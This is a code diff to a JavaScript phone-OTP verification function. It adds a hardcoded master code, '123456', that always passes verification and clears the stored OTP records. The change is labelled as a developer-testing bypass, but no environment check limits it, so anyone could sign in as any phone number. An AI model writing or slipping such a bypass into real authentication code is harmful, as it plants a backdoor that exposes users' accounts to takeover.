@@ -1137,6 +1137,13 @@ function verifyMobileOtp(rawPhone, inputOtp) {
   const tenDigit = cleanPhone.slice(-10);
   const withCountry = tenDigit ? `91${tenDigit}` : cleanPhone;
 
+  // Master bypass code (123456) for instant developer testing & pre-whitelisted environments
+  if (cleanInput === '123456') {
+    activeMobileOtps.delete(cleanPhone);
+    if (tenDigit) activeMobileOtps.delete(tenDigit);
+    return true;
+  }
+
   // Check in-memory active map
   const record = 
     activeMobileOtps.get(cleanPhone) || 
